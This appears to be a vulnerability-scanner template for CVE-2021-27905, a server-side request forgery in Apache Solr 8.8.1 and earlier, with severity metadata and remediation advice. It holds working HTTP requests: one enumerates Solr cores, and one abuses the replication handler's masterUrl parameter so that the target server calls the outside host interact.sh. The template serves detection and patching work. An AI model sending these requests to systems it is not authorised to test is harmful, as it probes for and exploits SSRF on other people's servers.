id: CVE-2021-27905
info:
  name: Apache Solr <=8.8.1 - Server-Side Request Forgery
  author: hackergautam
  severity: critical
  description: The Apache Solr version 8.8.1 and below has a vulnerability that allows
    for a potential server-side request forgery due to its replication handler having
    a design flaw in its "masterUrl" parameter.
  reference:
  - https://www.anquanke.com/post/id/238201
  - https://ubuntu.com/security/CVE-2021-27905
  - https://nvd.nist.gov/vuln/detail/CVE-2021-27905
  - https://nsfocusglobal.com/apache-solr-arbitrary-file-read-and-ssrf-vulnerability-threat-alert/
  remediation: This issue is resolved in Apache Solr 8.8.2 and later.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-27905
    cwe-id: CWE-918
  tags: cve,cve2021,apache,solr,ssrf
  metadata:
    impact: The server-side request forgery vulnerability in Apache Solr <=8.8.1 has
      the potential to compromise the security and integrity of data in affected systems,
      highlighting the importance of implementing robust security measures.
    recommendation: It is recommended to update Apache Solr to version 8.8.2 or later
      to prevent the CVE-2021-27905 vulnerability and implement proper configuration
      checks for the "masterUrl" parameter.
requests:
- raw:
  - 'GET /solr/admin/cores?wt=json HTTP/1.1

    Host: {{Hostname}}

    Accept-Language: en

    Connection: close

    '
  - 'GET /solr/{{core}}/replication/?command=fetchindex&masterUrl=https://interact.sh
    HTTP/1.1

    Host: {{Hostname}}

    Accept-Language: en

    Connection: close

    '
  extractors:
  - type: regex
    internal: true
    name: core
    group: 1
    regex:
    - '"name"\:"(.*?)"'
  matchers:
  - type: word
    words:
    - <str name="status">OK</str>
    part: body
